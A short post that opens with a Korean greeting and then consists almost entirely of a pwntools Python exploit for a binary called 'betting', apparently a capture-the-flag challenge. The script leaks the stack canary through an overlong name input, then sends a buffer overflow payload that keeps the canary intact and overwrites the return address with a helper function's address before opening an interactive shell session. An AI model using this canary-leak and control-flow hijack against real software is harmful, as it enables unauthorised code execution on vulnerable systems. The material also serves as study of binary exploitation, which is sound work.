
안녕하세요.

```python
from pwn import *
import time

helper = 0x4008f6
s = process('./betting')
#s = remote('110.10.147.29 8282',8282)

#leak
payload = 'A'*25
s.recvuntil('name? ') 
s.send(payload) 
s.recvuntil('start with? ')
s.sendline('100') 
time.sleep(0.3)
s.recvuntil('AAAAAAAAAAAAAAAAAAAAAAAAA')
canary = '\x00'+s.recv(7)
print (canary)

s.sendline('100')
s.recv()

payload += 'A'*15
payload += canary
payload += "AAAAAAAA"
payload += p64(helper)

s.sendline(payload)
s.interactive()
```
